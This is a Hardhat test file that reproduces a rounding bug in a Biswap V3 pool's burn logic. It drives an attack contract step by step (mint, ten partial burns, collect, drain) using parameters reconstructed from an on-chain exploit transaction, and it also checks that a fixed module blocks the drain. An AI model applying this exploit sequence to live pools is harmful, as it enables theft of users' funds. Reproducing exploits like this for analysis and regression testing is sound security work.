const { expect } = require("chai");
const { ethers, network } = require("hardhat");

// Values taken from the 24 Nov 2026 BiswapPoolV3 transaction
// 0x13b8310513cc7ff91ad24a966f6ced99aa535d2aef8a231e38737401c8e7f78c.
const FEE = 800;
const CURRENT_POINT = -400001;
const POINT_DELTA = 5;
const FEE_CHARGE_PERCENT = 20;

const LEFT_PT = -400050;
const RIGHT_PT = -400000;
const MINT_LIQUIDITY = 4_847_000_000n;
const BURN_LIQUIDITY = 484_700_000n;
const BURN_COUNT = 10n;

// 11,283.277957284066035619 tokenX bought with 63,263 wei of tokenY.
// This is the amountX field of the victim pool's Swap event.
const DESIRE_X = 11_283_277_957_284_066_035_619n;
const HIGH_PT = 800000;

// Pool balances immediately after the attacker's first (price-crashing)
// swap, reconstructed from the on-chain balances at blocks 135526419/20.
const POOL_SEED_X = 11_283_287_957_283_900_764_593n;
const POOL_SEED_Y = 81_501_165_597_941_276_329n;

// Plenty for the 500 wei mint + 63,263 wei swap input.
const ATTACKER_FUND_Y = 1_000_000n;

async function deployPool(liquidityModule) {
  const Token = await ethers.getContractFactory("MockERC20");
  const tokenA = await Token.deploy("Wrapped BNB", "WBNB");
  const tokenB = await Token.deploy("BUSD", "BUSD");
  await tokenA.waitForDeployment();
  await tokenB.waitForDeployment();

  // BiswapPoolV3 requires tokenX < tokenY. On BSC, WBNB < BUSD, so the lower
  // address plays the role of WBNB/tokenX in this reproduction.
  const a = await tokenA.getAddress();
  const b = await tokenB.getAddress();
  const [xAddress, yAddress] = BigInt(a) < BigInt(b) ? [a, b] : [b, a];
  const tokenX = await ethers.getContractAt("MockERC20", xAddress);
  const tokenY = await ethers.getContractAt("MockERC20", yAddress);

  const SwapY2XModule = await ethers.getContractFactory("SwapY2XModule");
  const swapY2X = await SwapY2XModule.deploy();
  await swapY2X.waitForDeployment();

  const Factory = await ethers.getContractFactory("MockBiswapFactory");
  const factory = await Factory.deploy();
  await factory.waitForDeployment();

  await factory.setPoolParams(
    xAddress,
    yAddress,
    FEE,
    CURRENT_POINT,
    POINT_DELTA,
    FEE_CHARGE_PERCENT
  );
  await factory.setModules(
    ethers.ZeroAddress,
    await swapY2X.getAddress(),
    await liquidityModule.getAddress(),
    ethers.ZeroAddress,
    ethers.ZeroAddress
  );

  const receipt = await (await factory.createPool()).wait();
  const created = receipt.logs
    .map((log) => {
      try {
        return factory.interface.parseLog(log);
      } catch {
        return null;
      }
    })
    .find((event) => event && event.name === "PoolCreated");

  const pool = await ethers.getContractAt("BiswapPoolV3", created.args.pool);

  // Seed the post-first-swap reserves. The pool already has no active
  // liquidity at point -400001, exactly like the victim pool.
  await tokenX.mint(await pool.getAddress(), POOL_SEED_X);
  await tokenY.mint(await pool.getAddress(), POOL_SEED_Y);

  return { factory, pool, tokenX, tokenY, swapY2X };
}

async function deployAttacker(pool, tokenX, tokenY) {
  const Attacker = await ethers.getContractFactory("AttackBiswapBurn");
  const attacker = await Attacker.deploy(
    await pool.getAddress(),
    await tokenX.getAddress(),
    await tokenY.getAddress(),
    LEFT_PT,
    RIGHT_PT,
    MINT_LIQUIDITY,
    BURN_LIQUIDITY,
    BURN_COUNT,
    DESIRE_X,
    HIGH_PT
  );
  await attacker.waitForDeployment();
  await tokenY.mint(await attacker.getAddress(), ATTACKER_FUND_Y);
  return attacker;
}

describe("Biswap V3 burn rounding — phantom liquidity", function () {
  this.timeout(120_000);

  before(async function () {
    // Keep this deterministic even if the optional fork test ran first.
    await network.provider.send("hardhat_reset");
  });

  it("leaves active liquidity untouched and drains tokenX", async function () {
    const LiquidityModule = await ethers.getContractFactory("LiquidityModule");
    const liquidityModule = await LiquidityModule.deploy();
    await liquidityModule.waitForDeployment();

    const { pool, tokenX, tokenY } = await deployPool(liquidityModule);
    const attacker = await deployAttacker(pool, tokenX, tokenY);
    const attackerAddress = await attacker.getAddress();

    const initialState = await pool.state();
    expect(initialState.currentPoint).to.equal(BigInt(CURRENT_POINT));
    expect(initialState.liquidity).to.equal(0n);
    expect(initialState.liquidityX).to.equal(0n);

    // Step 1: mint 4.847e9 liquidity. Only 500 wei of tokenY is needed.
    await attacker.mintPosition();
    let state = await pool.state();
    expect(state.liquidity).to.equal(MINT_LIQUIDITY);

    const positionKey = ethers.solidityPackedKeccak256(
      ["address", "int24", "int24"],
      [attackerAddress, LEFT_PT, RIGHT_PT]
    );
    let position = await pool.liquidity(positionKey);
    expect(position[1]).to.equal(MINT_LIQUIDITY);

    // Step 2: burn the position in ten slices. Each burn removes 484.7e6
    // liquidity from the position but state.liquidity never moves.
    for (let i = 1n; i <= BURN_COUNT; i++) {
      await attacker.burnOnce();

      state = await pool.state();
      position = await pool.liquidity(positionKey);

      expect(state.liquidity).to.equal(MINT_LIQUIDITY, "phantom liquidity must remain");
      expect(position[1]).to.equal(MINT_LIQUIDITY - BURN_LIQUIDITY * i);
    }

    // The position is gone; the pool still believes 4.847e9 is active.
    state = await pool.state();
    position = await pool.liquidity(positionKey);
    expect(position[1]).to.equal(0n);
    expect(state.liquidity).to.equal(MINT_LIQUIDITY);

    // Step 3: collect the 48 wei credited per burn.
    await attacker.collectOwed();
    expect(await attacker.collectedY()).to.equal(480n);

    // Step 4: buy tokenX with 63,263 wei of tokenY.
    const attackerXBefore = await tokenX.balanceOf(attackerAddress);
    const poolXBefore = await tokenX.balanceOf(await pool.getAddress());

    await attacker.drain();

    const attackerXAfter = await tokenX.balanceOf(attackerAddress);
    const poolXAfter = await tokenX.balanceOf(await pool.getAddress());

    expect(await attacker.mintPaidY()).to.equal(500n);
    expect(await attacker.swapPaidY()).to.equal(63_263n);
    expect(await attacker.swapReceivedX()).to.equal(DESIRE_X);

    expect(attackerXAfter - attackerXBefore).to.equal(DESIRE_X);
    expect(poolXBefore - poolXAfter).to.equal(DESIRE_X);

    state = await pool.state();
    expect(state.liquidity).to.equal(MINT_LIQUIDITY);
    expect(state.liquidityX).to.equal(2_896_494_600n);
    expect(state.currentPoint).to.equal(-394_508n);

    // Net tokenY paid: 500 mint + 63,263 swap - 480 collected = 63,283 wei.
    const netYPaid = 500n + 63_263n - 480n;
    const attackerYAfter = await tokenY.balanceOf(attackerAddress);
    expect(attackerYAfter).to.equal(ATTACKER_FUND_Y - netYPaid);

    console.log("    phantom liquidity left in pool:", state.liquidity.toString());
    console.log("    tokenX drained:", ethers.formatEther(DESIRE_X));
    console.log("    net tokenY paid (wei):", netYPaid.toString());
  });

  it("fixed module decrements active liquidity and blocks the drain", async function () {
    const LiquidityModuleFixed = await ethers.getContractFactory("LiquidityModuleFixed");
    const liquidityModule = await LiquidityModuleFixed.deploy();
    await liquidityModule.waitForDeployment();

    const { pool, tokenX, tokenY } = await deployPool(liquidityModule);
    const attacker = await deployAttacker(pool, tokenX, tokenY);

    await attacker.mintPosition();
    let state = await pool.state();
    expect(state.liquidity).to.equal(MINT_LIQUIDITY);

    const positionKey = ethers.solidityPackedKeccak256(
      ["address", "int24", "int24"],
      [await attacker.getAddress(), LEFT_PT, RIGHT_PT]
    );

    for (let i = 1n; i <= BURN_COUNT; i++) {
      await attacker.burnOnce();

      state = await pool.state();
      const position = await pool.liquidity(positionKey);

      expect(state.liquidity).to.equal(MINT_LIQUIDITY - BURN_LIQUIDITY * i);
      expect(position[1]).to.equal(MINT_LIQUIDITY - BURN_LIQUIDITY * i);
    }

    state = await pool.state();
    expect(state.liquidity).to.equal(0n);

    const poolXBefore = await tokenX.balanceOf(await pool.getAddress());
    await expect(attacker.drain()).to.be.reverted;

    expect(await tokenX.balanceOf(await attacker.getAddress())).to.equal(0n);
    expect(await tokenX.balanceOf(await pool.getAddress())).to.equal(poolXBefore);
  });
});
